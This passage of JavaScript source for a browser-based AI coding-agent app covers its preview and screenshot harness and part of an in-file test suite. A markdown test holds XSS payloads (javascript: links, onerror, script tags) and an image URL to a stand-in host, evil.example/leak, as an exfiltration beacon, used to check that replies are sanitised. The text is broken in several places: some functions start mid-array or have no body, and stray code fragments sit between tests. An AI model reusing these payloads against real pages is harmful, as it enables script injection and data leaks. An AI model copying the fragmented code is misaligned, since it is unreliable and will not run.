          if (failing.length) notes.push(`Failing tests took ${failing.join(", ")}: view_file them to see the page as it failed.`);
          if (untested) notes.push("No in-file tests ran. Add built-in tests (see Artifacts).");
          // Findings the last run reported too were read then: the list stays, the note doesn't.
          if (layout?.length && !seen) notes.push("The layout checks found what a person would see wrong (layout). Fix what your work made, or say why it is meant; mention what it didn't make.");
          if (phone && !seen) notes.push(`At a phone's width the page breaks where it didn't at ${size[0]}px (phone).`);
          // A frame is 16.7 ms and the browser needs part of it; past a third, a slower machine drops frames.
          if (loop?.p95 > 6) notes.push(`Your frame callbacks take ${loop.p95.toFixed(1)} ms at p95 (frames): find what costs before adding more. A phone has a fraction of this machine's speed.`);
          if (game?.same === false) notes.push("window.game replays differently from one seed and one list of inputs (game): something outside the state decides, such as Math.random, the clock, or an event read inside step. A game that can't replay can't be tested.");
          if (game?.error) notes.push("window.game threw while the harness played it (game). Tests drive the same door: fix it there.");
          // Sixty ticks a second, before anything is drawn.
          if (game?.tick > 1) notes.push(`A tick costs ${game.tick.toFixed(1)} ms (game), so sixty take ${(game.tick * 60).toFixed(0)} ms of each second before anything is drawn.`);
          if (timedOut.includes("load")) notes.push("The page never finished loading: look for a reload, a navigation, or a script that never returns.");
          // A suite that never started and one that stalled are different bugs, so each gets its own note.
          const reported = lines.filter(t => /^(PASS|FAIL):/.test(t)).length;
          if (timedOut.includes("tests")) notes.push(reported
            ? `Tests stopped after ${reported} reported: window.TESTS_DONE was never set. Look at the test after the last one logged. This is a failure; fix it before moving on.`
            : "No test started: nothing logged PASS or FAIL, and window.TESTS_DONE was never set. A suite that waits for ?test=1 never starts here; start it on window.__HARNESS__?.test too.");
          if (shot?.approximate && !parked) notes.push('Approximate DOM render. For real pixels, ask the user to click "Share tab".');
          if (notes.length) report.notes = notes;
          return report;
        }

        async function grabStream() {
          const { video } = capture;
          await sleep(100);
          await Promise.race([new Promise(r => video.requestVideoFrameCallback ? video.requestVideoFrameCallback(() => r()) : r()), sleep(400)]);
          if (!video.videoWidth) throw new Error("the capture stream has no frames");
          if (capture.tier !== "tab") return encodeImage(video, { sw: video.videoWidth, sh: video.videoHeight });
          const rect = visibleRect(surface);
          const kx = video.videoWidth / innerWidth, ky = video.videoHeight / innerHeight;
          return encodeImage(video, { sx: rect.left * kx, sy: rect.top * ky, sw: rect.width * kx, sh: rect.height * ky });
        }

        async function grabPlaywright() {
          // Playwright scrolls to the element, but one placed where scrolling can't reach comes back as the wrong pixels.
          const r = surface.getBoundingClientRect();
          if (r.left + scrollX < 0 || r.top + scrollY < 0 || r.width < 1 || r.height < 1) throw new Error("the preview is off the page");
          const data = await window.__captureScreenshot({ name: `app-${Date.now()}`, targetId: `preview-${id}`, base64: true });
          if (typeof data !== "string" || /\.png$/.test(data)) throw new Error("the screenshot binding did not return image data");
          const bitmap = await createImageBitmap(new Blob([Uint8Array.from(atob(data), c => c.charCodeAt(0))], { type: "image/png" }));
          return encodeImage(bitmap, { sw: bitmap.width, sh: bitmap.height });
        }

        // Fallback without permissions: re-renders the DOM into a canvas, so it is only approximate.
        async function rasterize(frame) {
          const canvas = await renderDom(frame);
          return encodeImage(canvas, { sw: canvas.width, sh: canvas.height });
        }

        async function renderDom(frame) {
          const win = frame.contentWindow, doc = frame.contentDocument;
          if (!doc?.body) throw new Error("the app has no document body");
          // modern-screenshot, not html-to-image: html-to-image drops an SVG's stylesheet paint, so fill: none drew black.
          const { domToCanvas } = await win.eval(`import("${CDN["modern-screenshot"]}/+esm")`);
          const width = doc.documentElement.clientWidth || 1280, height = doc.documentElement.clientHeight || 800;
          // A state just set is still transitioning to its colors; the render shows where it lands.
          const transitions = doc.getAnimations().filter(a => a instanceof win.CSSTransition).map(a => a.finished.catch(() => {}));
          await Promise.race([Promise.all(transitions), sleep(1000)]);
          const background = win.getComputedStyle(doc.body).backgroundColor;
          return domToCanvas(doc.documentElement, {
            width, height, scale: 1, font: false,
            backgroundColor: background && background !== "rgba(0, 0, 0, 0)" ? background : "#ffffff",
          });
        }

        // A view wider than a phone's comes with the page at a phone's width to its right, in one image: the models
        // that looked at one size almost never asked for the other, and the ones that did spent a run on each.
        async function besidePhone(image, frame) {
          const view = await createImageBitmap(new Blob([image.bytes], { type: `image/${image.format}` }));
          const phone = await renderDom(frame);
          const gap = 12, height = view.height, width = Math.round(phone.width * height / phone.height);
          const sheet = Object.assign(document.createElement("canvas"), { width: view.width + gap + width, height });
          const ctx = sheet.getContext("2d");
          ctx.fillStyle = "#808080";
          ctx.fillRect(view.width, 0, gap, height);
          ctx.drawImage(view, 0, 0);
          ctx.drawImage(phone, view.width + gap, 0, width, height);
          return encodeImage(sheet, { sw: sheet.width, sh: sheet.height }, 1400);
        }

        async function reveal() {
          setState({ tab: "preview", panel: true });
          await Promise.race([new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r))), sleep(100)]);
        }

        async function takeScreenshot(frame) {
          const tiers = [];
          if (capture.track?.readyState === "live") tiers.push([capture.tier, grabStream]);
          if (surface?.isConnected && window.__captureScreenshot) tiers.push(["playwright", grabPlaywright]);
          tiers.push(["dom", () => rasterize(frame)]);
          const failures = [];
          for (const [tier, grab] of tiers) {
            try {
              if (tier !== "dom") await reveal();
              const { image, thumb, fingerprint } = await grab();
              const shot = { tier };
              if (tier === "dom") shot.approximate = true;
              if (failures.length) shot.fallbackFrom = failures;
              return { image, thumb, fingerprint, shot };
            } catch (e) {
              failures.push(`${tier}: ${e.message}`);
            }
          }
          return { image: null, thumb: null, shot: { error: failures.join("; ") } };
        }

        const allShots = (previewRun, testRun) => [...testRun.shots, ...(previewRun === testRun ? [] : previewRun.shots)];

        // __HARNESS__.screenshot(name): the page as it is at that point, saved to resources for the model to view. The
        // test frame is parked off the page, so a test's shot is a DOM render; a script's is of the preview.
        async function shoot(run, name) {
          const path = `screenshots/${name.replace(/[^\w.-]+/g, "-").slice(0, 80) || "shot"}.webp`;
          try {
            const { image, shot } = run.mode === "test" ? { ...(await rasterize(run.frame)), shot: {} } : await takeScreenshot(run.frame);
            if (!image) throw new Error(shot.error);
            await resources("write", { path, content: new Blob([image.bytes], { type: `image/${image.format}` }) });
            run.shots.push({ path, ...(run.mode === "test" && { at: run.console.length }) });
            return path;
          } catch (e) {
            run.shots.push({ path, error: e.message });
            return null;
          }
        }

        // Runs doc as version { id, path }: the preview live, the tests in a parked frame. Answers { report, image,
        // thumb, runLog }; a project closed meanwhile throws { closed: true }. A parked run (a scratch page) is one
        // frame, off the page and tests on, so the preview stays the shown artifact's.
        // files: the rest of the folder, { path: text }, served beside it. signal: the run stops where it is.
        async function run({ version, doc, files = {}, script = null, screenshot = false, parked = false, signal = null }) {
          signal?.throwIfAborted();
          if (!parked) liveErrors = [];
          const started = performance.now();
          const size = sizeFor();
          testFrame ||= createFrame("App test run");
          park(testFrame);
          previewFrame ||= createFrame("App preview");
          if (!previewFrame.isConnected) park(previewFrame);
          if (parked) park(scratchFrame ||= createFrame("Scratch run"));
          const wanted = screenshot === true || (screenshot === "auto" && capture.track?.readyState === "live");
          const sheet = wanted && isHtml(version.path) && !parked && size[0] > VIEWPORTS.mobile[0] * 1.5;
          if (sheet) park(phoneFrame ||= createFrame("Phone-width view"), VIEWPORTS.mobile);
          const runs = `${RUNS}-${encodeURIComponent(id)}-${parked ? "scratch" : "app"}-`, base = `${runs}${++published}/`;
          const opened = closes;
          await closing;
          const url = await publish(base, version.path, doc, files);
          if (opened !== closes) {
            unpublish(base);
            throw Object.assign(new Error("The project closed during the run."), { closed: true });
          }
          // The last test run's databases go first: a page's open waits behind the delete of its name.
          for (const { name } of await indexedDB.databases()) if (name.startsWith(`harness-test:${id}:`)) indexedDB.deleteDatabase(name);
          const previewRun = parked ? load(scratchFrame, url, base, "test") : load(previewFrame, url, base, "preview");
          // Only HTML has tests; other artifacts are judged by their preview alone.
          const testRun = isHtml(version.path) && !parked ? load(testFrame, url, base, "test") : previewRun;
          const phoneRun = sheet && load(phoneFrame, url, base, "phone");
          const stop = () => { for (const r of [previewRun, testRun, phoneRun]) if (r) { r.aborted = true; r.onLoad(); } };
          signal?.addEventListener("abort", stop, { once: true });
          try {
            await Promise.all([settle(previewRun), testRun !== previewRun && settle(testRun), phoneRun && settle(phoneRun)]);
            previewRun.settled = true;
            unpublish(runs, base);
            const tested = [doc, ...Object.entries(files).filter(([p]) => /\.m?js$/.test(p)).map(([, text]) => text)].some(text => text.includes("TESTS_DONE"));
            if (isHtml(version.path) && tested) await waitForTests(testRun);
          } finally {
            signal?.removeEventListener("abort", stop);
          }
          signal?.throwIfAborted();
          if (previewRun.aborted || testRun.aborted) throw Object.assign(new Error("The project closed during the run."), { closed: true });
          // Before the script, whose own work isn't the page's.
          const loop = isHtml(version.path) && !parked ? await frameProfile(previewRun) : null;
          const game = testRun !== previewRun ? gameCheck(testRun) : null;
          let result, scriptError;
          const consoleBefore = previewRun.console.length;
          if (script) {
            try { result = await runScript(previewRun, script); }
            catch (e) { scriptError = String(e?.message || e); }
          }
          const scriptConsole = script ? previewRun.console.slice(consoleBefore).map(c => c.text) : [];
          const root = previewRun.frame.contentDocument?.documentElement;
          const overflow = root ? Math.max(0, root.scrollWidth - root.clientWidth) : 0;
          const layout = isHtml(version.path) && !parked ? layoutChecks(previewRun.frame.contentDocument) : [];
          const phone = isHtml(version.path) && !parked ? await atPhoneWidth(testRun, size, layout) : null;
          let { image = null, thumb = null, fingerprint = null, shot = null } = !wanted ? {}
            : parked ? { ...(await rasterize(scratchFrame)), shot: { tier: "dom", approximate: true } } : await takeScreenshot(previewFrame);
          if (image && phoneRun && !phoneRun.aborted) {
            try {
              ({ image, thumb, fingerprint } = await besidePhone(image, phoneFrame));
              shot = { ...shot, phone: `right of the gray bar: the page as loaded at ${VIEWPORTS.mobile.join("x")}, an approximate render` };
            } catch (e) {
              shot = { ...shot, phone: `none: ${e.message}` };
            }
          }
          // An automatic screenshot that shows nothing new costs tokens and says nothing; name the one it matches instead.
          if (!parked && screenshot === "auto" && image && sameView(fingerprint, lastShot?.fingerprint)) {
            image = null;
            shot = { ...shot, unchanged: `looks the same as the screenshot of v${lastShot.version}` };
          } else if (image && !parked) {
            lastShot = { fingerprint, version: version.id };
          }
          const found = JSON.stringify([version.path, layout, phone?.layout]), seen = found === lastLayout;
          if (!parked) lastLayout = found;
          const report = buildReport({ version, previewRun, testRun, overflow, layout, phone, seen, loop, game, script, scriptConsole, result, scriptError, shot, size, parked, ms: Math.round(performance.now() - started) });
          return { report, image, thumb, runLog: testRun.console.slice(-500) };
        }

        async function enableCapture() {
          if (!navigator.mediaDevices?.getDisplayMedia) throw new Error("Screen capture is not supported in this browser.");
          disableCapture();
          const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { displaySurface: "browser" }, preferCurrentTab: true, selfBrowserSurface: "include", audio: false,
          });
          const [track] = stream.getVideoTracks();
          let tier = "tab";
          // Element Capture shows only the preview, even under overlapping UI; Region Capture crops to it.
          if (surface && window.RestrictionTarget && track.restrictTo) {
            try { await track.restrictTo(await RestrictionTarget.fromElement(surface)); tier = "element"; }
            catch (e) { console.warn("Element capture unavailable:", e.message); }
          }
          if (tier === "tab" && surface && window.CropTarget && track.cropTo) {
            try { await track.cropTo(await CropTarget.fromElement(surface)); tier = "region"; }
            catch (e) { console.warn("Region capture unavailable:", e.message); }
          }
          const video = document.createElement("video");
          Object.assign(video, { muted: true, playsInline: true, srcObject: stream });
          video.style.cssText = "position:fixed;left:-20000px;top:0;width:320px;height:180px;";
          document.body.appendChild(video);
          await video.play();
          track.addEventListener("ended", () => {
            disableCapture();
            notify('Tab sharing stopped. Click "Share tab" to share it again.');
          });
          Object.assign(capture, { stream, track, video, tier });
          lastShot = null;
          setState("capture", tier);
          rememberCapture("allowed");
          return tier;
        }

        function disableCapture() {
          capture.stream?.getTracks().forEach(t => t.stop());
          capture.video?.remove();
          Object.assign(capture, { stream: null, track: null, video: null, tier: "none" });
          setState("capture", "none");
        }

        // Closing the project blanks the preview; a run waiting on it stops.
        function blank() {
          lastShot = null;
          liveErrors = [];
          closes++;
          for (const frame of [previewFrame, testFrame, scratchFrame, phoneFrame]) frame?.__harness?.abort();
          if (previewFrame) previewFrame.srcdoc = "";
          if (workspaceCache) closing = unpublish(`${RUNS}-${encodeURIComponent(id)}-`);
        }

        async function captureView(path) {
          const { image, shot } = await takeScreenshot(previewFrame);
          if (!image) throw new Error(`No screenshot: ${shot.error}`);
          return new File([image.bytes], `${path.replace(/[^\w.-]+/g, "_")}.${image.format}`, { type: `image/${image.format}` });
        }

        function dispose() {
          disableCapture();
          previewFrame?.remove();
          testFrame?.remove();
          scratchFrame?.remove();
          phoneFrame?.remove();
        }

        return {
          run, blank, captureView, mountPreview, enableCapture, disableCapture, rememberCapture, dispose,
          reset: () => { lastShot = null; liveErrors = []; },
          liveErrors: () => liveErrors.splice(0), // taken once, by the next message
        };
      }

      // #endregion

      // #region 5. TESTS
      // =============================================================================
      // Test suite activated with ?test=1 query parameter, or by the harness when this app runs inside itself.
      // =============================================================================

      if (new URLSearchParams(window.location.search).get("test") === "1" || window.__HARNESS__?.test) {
        // The engine's internals the tests reach for, beside what the app imports.
        const {
          DIRECTOR_RULES, FLAGS_KEY, PRE_DIRECTOR_RULES, activeRules, flag, modelInfo, snapshotSettings, MEMORY_BUDGET, TOOLS, appendReasoning, applyEdits, blobCache, buildMessageTree, contradictedClaim,
          createDirector, editFile, editor, runCheck,
          failingReport, forkOf, getBlob, getContentBlock, getConverseClient, getConverseCommand, getGeminiClient,
          getMostRecentPath, getToolResults, listHistory, mcp, memoriesBlock, missingFiles, normalizePath, outline,
          overlap, ownedTools, polishedTake, preflight, prepareMessages, processStreamChunk, providerOf, proxyFetch,
          reasoningFields, relayUrl, restoreVersion, runAgentWithBranching, runApp, runningSubagents, setSubagent,
          siblingFiles, silentReply, systemPrompt, task, think, toDocument, unadoptedVariants, unplannedTask, untestedChange, viewFile,
          watchedSend, webSearch, writeFile,
        } = await import("./engine.js");
        const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);
        // Tests that reach third-party sites run only when asked (npm test -- --net adds net=1).
        const NET = new URLSearchParams(location.search).has("net");
        const assert = (cond, msg) => { if (!cond) throw new Error(msg || "Assertion failed"); };

        async function runTests(tests) {
          let passed = 0, failed = 0;
          for (const test of tests) {
            try {
              await test();
              console.log(`PASS: ${test.name}`);
              passed++;
            } catch (e) {
              console.error(`FAIL: ${test.name}\n   ${e.message}`);
              failed++;
            }
          }
          console.log(`Results: ${passed} passed, ${failed} failed`);
          return { passed, failed };
        }

        async function testBranchingAndParseJSON() {
          // Test branching: create tree with branches, verify navigation
          const messages = [
            { id: 1, parentId: null, createdAt: 1000, role: "user", content: [] },
            { id: 2, parentId: 1, createdAt: 2000, role: "assistant", content: [] },
            { id: 3, parentId: 1, createdAt: 3000, role: "assistant", content: [] },
            { id: 4, parentId: 3, createdAt: 4000, role: "user", content: [] },
          ];
          const tree = buildMessageTree(messages);

          assert(eq(tree.rootIds, [1]), "rootIds should be [1]");
          assert(eq(tree.nodes.get(1).childIds, [2, 3]), "children sorted by createdAt");
          assert(eq(getMostRecentPath(tree), [1, 3, 4]), "most recent path follows newest branch");
          assert(eq(getSiblings(tree, 2), [2, 3]), "siblings include both branches");
          assert(eq(getPathToMessage(tree, 4), [1, 3, 4]), "path from root to message");
          assert(eq(extendPath(tree, [1]), [1, 3, 4]), "extend path to leaf");

          const empty = buildMessageTree([]);
          assert(eq(empty.rootIds, []), "empty tree has no roots");
          assert(eq(getMostRecentPath(empty), []), "empty tree has no path");

          // Test parseJSON
          assert(eq(parseJSON('{"a": 1}'), { a: 1 }), "complete object");
          assert(eq(parseJSON("[1, 2, 3]"), [1, 2, 3]), "complete array");
          assert(parseJSON('{"name": "test", "val').name === "test", "partial object");
          assert(eq(parseJSON("[1, 2, 3"), [1, 2, 3]), "partial array");
          assert(eq(parseJSON("true"), true), "literal true");
          assert(eq(parseJSON("null"), null), "literal null");
          assert(eq(parseJSON(""), null), "empty string");
          assert(eq(parseJSON({ x: 1 }), { x: 1 }), "non-string passthrough");
        }

        async function testUIRendering() {
          await new Promise(r => setTimeout(r, 100));
          const app = document.getElementById("app");
          assert(app, "App container exists");
          assert(app.querySelector("form#inputForm"), "Input form renders");
          assert(app.querySelector("textarea#userMessage"), "Message textarea renders");
          assert(app.querySelector("button[type='submit']"), "Send button renders");
          const modelSelect = app.querySelector("#modelId");
          assert(modelSelect?.options?.length > 0, "Model select has options");
          assert(app.querySelector("#reasoningMode")?.value && app.querySelector("input[type=range][aria-label='Reasoning effort']"), "Reasoning is a slider over a level");
          assert(app.querySelector("#userFiles")?.type === "file", "File input exists");
        }

        // Why: a reply reads as the model wrote it, and one that echoes a hostile page can't run, restyle, or phone home
        async function testMarkdownReplies() {

            "## Plan", "Some *emphasis*, **bold**, ~~gone~~ and `code`.", "",
            "| Name | Size |", "|:--|--:|", "| marked | 12 kB |", "",
            "> quoted", "", "- a", "  - nested", "", "```js", "const x = 1 < 2;", "```", "",
            "[site](https://example.com) [bad](javascript:alert(1)) ![pixel](https://evil.example/leak?k=1)",
            "<img src=x onerror=alert(1)><script>alert(1)<\/script><style>body{display:none}</style><b style='position:fixed'>raw</b><form><button>go</button></form>",
            "", "<div><script>alert(2)<\/script>", "", "<p onclick=alert(3)>held</p>", "", "</div>",
          ].join("\n")).blocks.join(""), "text/html").body;

          assert([...doc.querySelectorAll("td")].map(td => td.textContent).join() === "marked,12 kB" && q("td[align=right]"), "a table renders, aligned");
          assert(q("blockquote") && q("ul ul li")?.textContent === "nested" && q("pre code")?.textContent === "const x = 1 < 2;\n", "quotes, nested lists and code render");
          const links = [...doc.querySelectorAll("a")];
          assert(links.every(a => a.target === "_blank" && a.rel === "noopener") && !links.some(a => /^javascript:/i.test(a.getAttribute("href"))), "links open beside the app, and none runs script");
          assert(!q("img, script, style, form, button, [style], [onerror], [onclick]") && !/display:none|alert\(2\)/.test(doc.innerHTML) && links.some(a => a.textContent === "pixel" && a.href === "https://evil.example/leak?k=1"), `nothing runs, restyles, or loads unasked; an image is its link: ${doc.innerHTML}`);
        }

        // Why: each block was rendered alone, so a reference link lost its definition and a <details> lost what it held
        async function testMarkdownWholeParse() {

        // Why: an engine that couldn't start, or refused the tab, left every send waiting and nothing on the page said why
        async function storyEngineRefused() {
          const { port1, port2 } = new MessageChannel();
          const heard = [];
          port2.onmessage = ({ data }) => heard.push(data);
          const ui = createTestUI({ port: port1 });
          try {
            await waitFor(() => heard.some(m => m.type === "hello"));
            const opening = ui.chat.openThread(1).then(() => "opened", e => e.message);
            await waitFor(() => heard.some(m => m.type === "command"));
            port2.postMessage({ type: "refused", reason: "The engine failed to start: no network." });
            assert((await opening) === "The engine failed to start: no network.", "a command waiting on the engine fails with the reason");
            await waitFor(() => ui.container.querySelector("[data-engine-failed]"));
            const notice = ui.container.querySelector("[data-engine-failed]");
            assert(notice.textContent.includes("no network") && buttonWithText(notice, "Reload"), `the page says why, and offers a reload: ${notice.textContent}`);
            const sent = await ui.chat.sendMessage("hi", [], "echo", "off").then(() => "sent", e => e.message);
            assert(sent === "The engine failed to start: no network." && !ui.chat.agent.loading, `and a send after it fails at once: ${sent}`);
          } finally {
            ui.cleanup();
            port2.close();
          }
          // A page whose boot fails says so in place of the app, and a newer database says to reload.
          const box = document.createElement("div");
          bootFailed(new Error("idb is down"), box);
          assert(box.querySelector("[data-boot-error]")?.textContent.includes("couldn't start: idb is down") && buttonWithText(box, "Reload"), `a boot error is shown: ${box.textContent}`);
          bootFailed(Object.assign(new Error("version"), { name: "VersionError" }), box);
          assert(box.textContent.startsWith("The saved data is from a newer version") && box.children.length === 1, `a newer database says to reload: ${box.textContent}`);
          assert(!document.querySelector("#app [data-placeholder]") && document.querySelector("#app form#inputForm"), "and the app, once up, replaced its Loading… placeholder");
        }

        // Mock client that simulates streaming responses
        function createMockClient(responses) {
          let callIndex = 0;
          return {
            async send(input) {
              const response = responses[callIndex++] || responses[responses.length - 1];
              return {
                stream: (async function* () {
                  for (const block of response.blocks) {
                    yield block;
                    await new Promise(r => setTimeout(r, 5));
                  }
                  yield { messageStop: { stopReason: response.stopReason || "end_turn" } };
                })()
              };

        // Swaps the tab's proxy setting and fetch for a test, and puts both back. proxy: false is no proxy at all.
        async function withNetwork({ proxy, brave, fetch: stub }, fn) {
          const realFetch = globalThis.fetch, saved = localStorage.getItem(PROXY_CONFIG_KEY), key = localStorage.getItem("brave-config");
          try {
            if (proxy === false) localStorage.removeItem(PROXY_CONFIG_KEY);
            else if (proxy) localStorage.setItem(PROXY_CONFIG_KEY, JSON.stringify({ endpoint: proxy }));
            if (brave === false) localStorage.removeItem("brave-config");
            else if (brave) localStorage.setItem("brave-config", JSON.stringify({ apiKey: brave }));
            if (stub) globalThis.fetch = stub;
            return await fn();
          } finally {
            globalThis.fetch = realFetch;
            saved == null ? localStorage.removeItem(PROXY_CONFIG_KEY) : localStorage.setItem(PROXY_CONFIG_KEY, saved);
            key == null ? localStorage.removeItem("brave-config") : localStorage.setItem("brave-config", key);
          }
        }

        // Why: reading a page and computing from it took a read_url call, then a code call with the page pasted in
        async function testCodeWeb() {
          const asked = [];
          const stub = async (url, options = {}) => {
            asked.push(String(url));
            if (/api\.search\.brave\.com/.test(url)) return new Response(JSON.stringify({ web: { results: [{ title: "Moon", url: "https://en.wikipedia.org/wiki/Moon", description: "Earth's satellite" }] } }), { headers: { "content-type": "application/json" } });
            if (/missing/.test(url)) return new Response("gone", { status: 404, statusText: "Not Found", headers: { "content-type": "text/plain" } });
            return new Response("radius 1737 km\nmass 7.35e22 kg", { headers: { "content-type": "text/plain" } });
          };
          const result = await withNetwork({ proxy: "http://localhost:1", brave: "k", fetch: stub }, () => code({ source: `
            console.log(typeof web.read, typeof web.search);
            const page = await web.read("https://example.com/moon.txt");
            console.log(Number(page.match(/radius (\\d+) km/)[1]) * 2);
            console.log(await web.search("moon", { count: 1 }));
            try { await web.read("https://example.com/missing"); } catch (e) { console.log("threw " + e.message); }
          ` }));
          const logs = result.logs ?? [];
          assert(logs[0] === "function function", `web.read and web.search are there: ${JSON.stringify(result)}`);
          assert(logs[1] === "3474", `web.read returns read_url's text, and code computes from it: ${JSON.stringify(logs)}`);
          assert(logs[2]?.startsWith("1. Moon\n   https://en.wikipedia.org/wiki/Moon"), `web.search returns web_search's text: ${JSON.stringify(logs)}`);
          assert(logs[3] === "threw https://example.com/missing answered 404 Not Found.", `a failed read throws read_url's error: ${JSON.stringify(logs)}`);
          assert(asked.some(u => u.endsWith("/https://example.com/moon.txt")) && asked.some(u => u.includes("api.search.brave.com")), `the tab did the reading: ${asked}`);

          const keyless = await withNetwork({ brave: false, fetch: stub }, () => code({ source: `try { await web.search("x") } catch (e) { console.log(e.message) }` }));
          assert(keyless.logs?.[0] === "web.search needs a Brave Search key: add one in Settings (the gear button).", `without a key, web.search says what it needs: ${JSON.stringify(keyless)}`);
          const unproxied = await withNetwork({ proxy: false, brave: "k", fetch: stub }, () => getProxyConfig()?.endpoint ? null : code({ source: `try { await web.search("x") } catch (e) { console.log(e.message) }` }));

          assert(usesNetwork("await fetch(u)") && usesNetwork("const m = await import(u)") && usesNetwork("await web.read(u)") && !usesNetwork("console.log(1 + 1)"), "network code is told from computing");
        }

            "function* count(n) { for (let i = 0; i < n; i++) yield i; }",
            "let sum = 0, n = 0;",
            "for (const i of count(5)) sum += i;",
            "for (const k in { a: 1, b: 2 }) sum += k.length;",
            "outer: for (let i = 0; i < 3; i++) for (let j = 0; ; j++) { if (j === 2) continue outer; sum++; }",
            "do n++; while (n < 3);",
            "while (n < 1e6) n++;",
            "for await (const v of (async function* () { yield 1; yield 2; })()) sum += v;",

        // These tests tell the story of why and how this application was built.

        // Test harness: creates isolated UI for each story test
        // port: the engine's, for a story that plays the engine itself.
        function createTestUI({ port = null } = {}) {
          const container = document.createElement("div");
          container.id = "test-ui-" + Date.now();
          container.style.cssText = "position:absolute;left:-9999px;top:0;width:1200px;height:700px;";
          document.body.appendChild(container);

          // Render a fresh App that leaves the page URL alone; its workspace is exposed for assertions.
          let harness = {};
          const dispose = render(() => html`<${App} urlSync=${false} port=${port} onReady=${value => harness = value} />`, container);

          // Send through the real form and wait until the agent loop finishes.
          async function send(message, { model = "echo", reasoning = false, timeout = 10000 } = {}) {
            const form = container.querySelector("form#inputForm");
            form.modelId.value = model;
            form.reasoningMode.value = reasoning === true ? "high" : reasoning || "off";
            form.userMessage.value = typeof message === "string" ? message : JSON.stringify(message);
            const initialCount = container.querySelectorAll(".message-block").length;

            form.requestSubmit();
            await waitFor(() => form.dataset.loading === "false" && container.querySelectorAll(".message-block").length > initialCount + 1, timeout);

            const getMessages = () => container.querySelectorAll(".message-block");
            return {
              messages: getMessages(),
              lastMessage: () => {
                const msgs = getMessages();
                return msgs.length > 0 ? msgs[msgs.length - 1] : null;
              }
            };
          }

          return {
            container,
            send,
            get workspace() { return harness.workspace; },
            get chat() { return harness.chat; },
            idle: (timeout = 10000) => waitFor(() => container.querySelector("form#inputForm")?.dataset.loading === "false", timeout),
            cleanup: () => { dispose(); container.remove(); },
          };
        }

        async function waitFor(check, timeout = 5000) {
          const until = performance.now() + timeout;
          while (!check()) {
            if (performance.now() > until) throw new Error("Timed out waiting for the UI: " + String(check).slice(0, 160));
            await new Promise(r => setTimeout(r, 20));
          }
        }

          assert(applyEdits("a\r\nb\r\n", [{ old_str: "a\nb", new_str: "c\nd" }]) === "c\r\nd\r\n", "CRLF files accept LF edits");

          const notes = [];
          const indented = "<ul>\n    <li>one</li>\n    <li>two</li>\n</ul>\n";
          const loose = applyEdits(indented, [{ old_str: "  <li>one</li>  \n  <li>two</li>", new_str: "  <li>one</li>\n  <li>2</li>" }], { notes });

        // Why: through the local proxy, the agent's code can read any site, load any library, and talk to TCP services
        async function testLocalProxy() {
          if (!NET) return console.log("SKIP: testLocalProxy (reaches the internet; run with --net)");
          const endpoint = getProxyConfig()?.endpoint;
          if (!endpoint) return console.log("SKIP: testLocalProxy (no proxy; npm run start:proxy)");
          const page = await (await proxyFetch("https://example.com/")).text();
          assert(page.includes("Example Domain"), "a site without CORS headers is readable");
          const echo = await (await proxyFetch("https://httpbin.org/anything", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ n: 1 }) })).json();
          assert(echo.method === "POST" && echo.json?.n === 1, `requests keep their method and body: ${JSON.stringify(echo).slice(0, 200)}`);

          const relay = relayUrl();
          const result = await code({ timeout: 30, source: `
            const { marked } = await import("${CDN.marked}/+esm");
            const readme = await (await fetch("https://raw.githubusercontent.com/solidjs/solid/main/README.md")).text();
            console.log("markdown:" + marked.parse(readme).includes("<h"));
            const { ProxySocket } = await import("${CDN.tcpipe}/lib/proxy-socket.js");
            const reply = await new Promise((resolve, reject) => {
              const socket = new ProxySocket(${JSON.stringify(relay)});
              let text = "";
              socket.on("data", chunk => text += new TextDecoder().decode(chunk));
              socket.on("close", () => resolve(text));
              socket.on("error", reject);
              socket.connect(${location.port}, "localhost", () => socket.write("HEAD / HTTP/1.0\\r\\n\\r\\n"));
            });
            console.log("tcp:" + reply.split("\\r\\n")[0]);
            const { DnsClient } = await import("${CDN.tcpipe}/clients/dns.js");
            const dns = await new DnsClient(${JSON.stringify(relay)}).connect(53, "1.1.1.1");
            const answer = await dns.resolve("example.com");
            dns.close();
            console.log("dns:" + answer.some(record => record.type === "A") + " " + JSON.stringify(answer));
          ` });
          const logs = result.logs.join("\n");
          assert(logs.includes("markdown:true"), `a CDN library renders a fetched README: ${logs}`);
          assert(logs.includes("tcp:HTTP/1."), `a raw TCP socket reaches a local server: ${logs}`);
          assert(logs.includes("dns:true"), `a tcpipe client resolves DNS over TCP: ${logs}`);
        }

        // Why: long agentic runs keep their recent evidence and a stable, cacheable prefix
        async function testPrepareMessages() {
          const big = "x".repeat(4000);
          const messages = [{ id: 1, role: "user", content: [{ text: "build it" }] }];
          for (let i = 0; i < 22; i++) {
            messages.push({ id: 100 + i, role: "assistant", content: [{ toolUse: { toolUseId: "t" + i, name: "view_file", input: { path: "a.html" } } }] });
            messages.push({ id: 200 + i, role: "user", content: [{ toolResult: { toolUseId: "t" + i, content: [{ json: { result: { text: big } } }, { image: { format: "png", source: { bytes: new Uint8Array(1) } } }] } }] });
          }
          const out = prepareMessages(messages);
          const results = out.filter(m => m.content[0]?.toolResult).map(m => m.content[0].toolResult.content);
          const shots = results.filter(r => r.some(c => c.image)).length;
          assert(shots >= 3 && shots < 6, `only the newest few screenshots stay: ${shots}`);
          assert(results[9][0].json.result.elided?.includes("view_file"), `old bulky results become a note: ${JSON.stringify(results[9][0]).slice(0, 120)}`);
          assert(results.slice(10).every(r => r[0].json.result.text === big), "the newest results stay whole");
          const delegated = messages.map(m => m.id === 100 ? { ...m, content: [{ toolUse: { toolUseId: "t0", name: "task", input: { type: "explore", prompt: "p" } } }] } : m);
          assert(prepareMessages(delegated)[2].content[0].toolResult.content[0].json.result.text === big, "a sub-agent's answer is never stubbed");
          const again = prepareMessages(messages.slice(0, -2));
          assert(JSON.stringify(again[2]) === JSON.stringify(out[2]), "shrinking happens in steps, so the prefix holds between turns");
          const signed = prepareMessages([{ role: "assistant", content: [{ reasoningContent: { reasoningText: { signature: "s" } } }, { text: "ok" }] }]);
          assert(signed[0].content[0].reasoningContent.reasoningText.text === "" && signed[0].content[0].reasoningContent.reasoningText.signature === "s", "thinking that arrived as a signature alone goes back with empty text");
          const summarized = prepareMessages(messages, { summary: { throughId: 200 + 5, text: "did half" } });
          assert(summarized[0].content[0].text.includes("did half") && summarized.length === messages.length - messages.findIndex(m => m.id === 205), "a summary replaces what it covers");
